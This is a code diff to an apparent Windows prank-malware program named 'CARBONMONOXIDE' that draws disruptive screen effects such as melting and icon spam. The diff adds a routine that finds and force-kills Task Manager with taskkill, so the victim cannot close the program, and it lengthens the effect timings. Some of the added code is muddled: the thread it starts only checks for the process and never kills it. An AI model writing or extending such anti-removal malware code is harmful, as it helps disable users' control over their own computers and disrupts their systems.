@@ -9,6 +9,22 @@ import pyaudio
 import pyfiglet
 from win32api import RGB
 from ctypes import wintypes
+import os
+
+
+class no_taskmanager():
+    def is_running(process_name):
+        tasks = os.popen('tasklist /FI "IMAGENAME eq {}" /NH'.format(process_name)).read().strip()
+        return process_name.lower() in tasks.lower()
+    
+    try:
+        if is_running("taskmgr.exe"):
+            os.system("taskkill /F /IM taskmgr.exe")
+    except Exception as e:
+        print(f"Error while trying to close task manager: {e}")
+
+threading.Thread(target=no_taskmanager.is_running, args=("taskmgr.exe",)).start()
+    
 
 pyfiglet.print_figlet("CARBONMONOXIDE", font="ansi_shadow", colors="CYAN")
 
@@ -344,8 +360,8 @@ class EffectManager:
             (IconSpamEffect(hdc, memdc, x, y, w, h), 6),
             (IconTunnelInvertEffect(hdc, memdc, x, y, w, h), 7),
             (ColorEffect(hdc, memdc, x, y, w, h), 6),
-            (InvertRandColors(hdc, memdc, x, y, w, h), 7),
-            (MeltingScreenEffect(hdc, memdc, x, y, w, h), None)
+            (InvertRandColors(hdc, memdc, x, y, w, h), 13),
+            (MeltingScreenEffect(hdc, memdc, x, y, w, h), 14)
 
         ]
         self.start_time = time.time()
